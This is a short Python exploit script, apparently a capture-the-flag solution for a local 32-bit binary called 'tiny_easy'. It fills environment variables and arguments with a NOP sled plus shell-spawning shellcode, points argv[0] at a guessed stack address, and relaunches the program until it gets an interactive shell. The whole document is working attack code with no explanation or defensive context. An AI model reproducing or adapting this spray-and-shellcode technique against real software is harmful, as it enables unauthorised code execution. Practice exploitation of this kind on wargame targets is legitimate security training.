from pwn import *

fname = "./tiny_easy"
context(os="linux", arch="i386")

possible_addr = 0xffc48548

payload = b'A='+b'\x90'*0x8000
payload += asm(shellcraft.sh())

_argv = [p32(possible_addr)]
_env = {}

for i in range(25):
    _env[str(i)] = payload
    _argv.append(payload)

for _ in range(100):
    p = process(executable=fname, argv=_argv, env=_env)
    p.interactive()
